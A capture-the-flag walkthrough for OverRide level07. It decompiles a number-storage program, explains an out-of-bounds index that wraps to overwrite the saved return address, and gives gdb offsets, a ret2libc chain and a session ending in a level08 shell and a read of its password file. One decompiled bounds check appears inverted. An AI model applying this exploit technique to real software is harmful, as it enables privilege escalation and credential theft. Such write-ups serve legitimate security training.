# OverRide — Level07 Walkthrough

## Binary Analysis

The program provides a small interactive interface with 3 commands:

- `store`: write a number at an index,
- `read`: read a number from an index,
- `quit`: exit.

Core decompiled logic:

```c
void clear_stdin() {
    int8_t val = 0;

    while (1) {
        val = getchar();
        if (val == '\n' || val == EOF) {
            return;
        }
    }
}

unsigned int get_unum(void) {
    uint32_t var1 = 0;

    fflush(stdout);
    scanf("%u", &var1);
    clear_stdin();
    return var1;
}

void prog_timeout() {
    exit(1);
}

int store_number(int32_t *buffer) {
    uint32_t number; // EBP - 0x10
    uint32_t index; // EBP - 0xc

    printf(" Number: ");
    number = get_unum();
    printf(" Index: ");
    index = get_unum();

    if (!(index % 3) || number >> 0x18 != 0xb7) {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    }
    buffer[index] = number;
    return 0;
}

int read_number(int32_t *buffer) {
    uint32_t index = 0; // EBP - 0xc

    printf(" Index:");
    index = get_unum();
    printf(" Number at data[%u] is %u\n", index, buffer[index]);
    return 0;
}

int main(int argc, char *argv[], char *envp[]) {
    int8_t buffer[0x64] = {0}; // ESP + 0x24
    int8_t **av = argv; // ESP + 0x1c
    int8_t **ep = envp; // ESP + 0x18

    int32_t cmd_ret = 0; // ESP + 0x1b4
    int8_t cmd_buffer[20] = {0}; // ESP + 0x1b8

    while (*av) {
        memset(*av, 0, strlen(*av));
        *av++;
    }
    while (*ep) {
        memset(*ep, 0, strlen(*ep));
        *ep++;
    }

    puts("----------------------------------------------------\n  Welcome to wil's crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------");
    
    while (1) {
        printf("Input command: ");
        fgets(cmd_buffer, 0x14, stdin);
        cmd_buffer[strlen(&cmd_buffer) - 1] = 0;

        if (!strncmp(cmd_buffer, "store", 5)) {
            cmd_ret = store_number(buffer);
        } else if (!strncmp(cmd_buffer, "read", 4)) {
            cmd_ret = read_number(buffer);
        } else if (!strncmp(cmd_buffer, "quit", 4)) {
            return 0;
        }

        if (cmd_ret == 0) {
            printf(" Completed %s command successfully\n", &cmd_buffer);
        } else {
            printf(" Failed to do %s command\n", &cmd_buffer);
        }
        memset(&cmd_buffer, 0, 0x14);
    }
    return 0;
}
```

Main weakness: no real bounds check on `index` before accessing `tab[index]`.

## Vulnerability

`tab` is only `int tab[100]`, but user-controlled indices are not constrained.

There is one restriction (`index % 3 == 0` is blocked), but it can be bypassed using large unsigned indices. Addressing is computed as:

```text
target = tab_base + index * 4
```

On 32-bit arithmetic, `index * 4` wraps modulo $2^{32}$. This allows us to reach stack locations outside the array, including saved `EIP`.

## Finding the Offset

From `gdb`:

```bash
(gdb) info frame
Stack level 0, frame at 0xffffd690:
 Saved registers:
  ebp at 0xffffd688, eip at 0xffffd68c

(gdb) p/x $esp+0x24
$1 = 0xffffd4c4
```

So:

```text
offset = (saved_eip - tab_base) / 4
offset = (0xffffd68c - 0xffffd4c4) / 4
offset = 114
```

To bypass normal indexing, use equivalent wrapped indices:

- `114`  -> `1073741938`
- `115`  -> `1073741939`
- `116`  -> `1073741940`

## Exploit Strategy (ret2libc)

Environment variables are cleared by the program, so payload data must be written through the `tab` primitive.

We overwrite saved return values with:

1. `system()` address,
2. fake return address (`0x0`),
3. `"/bin/sh"` address.

### Resolve addresses in `gdb`

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) info sharedlibrary
From        To          Syms Read   Shared Object Library
0xf7fdc820  0xf7ff501f  Yes (*)     /lib/ld-linux.so.2
0xf7e42f70  0xf7f7633c  Yes (*)     /lib32/libc.so.6

(gdb) find 0xf7e42f70, +99999999, "/bin/sh"
0xf7f897ec
```

Values to write:

- `0xf7e6aed0` -> `4159090384`
- `0x00000000` -> `0`
- `0xf7f897ec` -> `4160264172`

## Exploit Execution

```bash
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully

Input command: store
 Number: 0
 Index: 1073741939
 Completed store command successfully

Input command: store
 Number: 4160264172
 Index: 1073741940
 Completed store command successfully

Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

## Result

Successfully gained access as `level08` and recovered the next level password.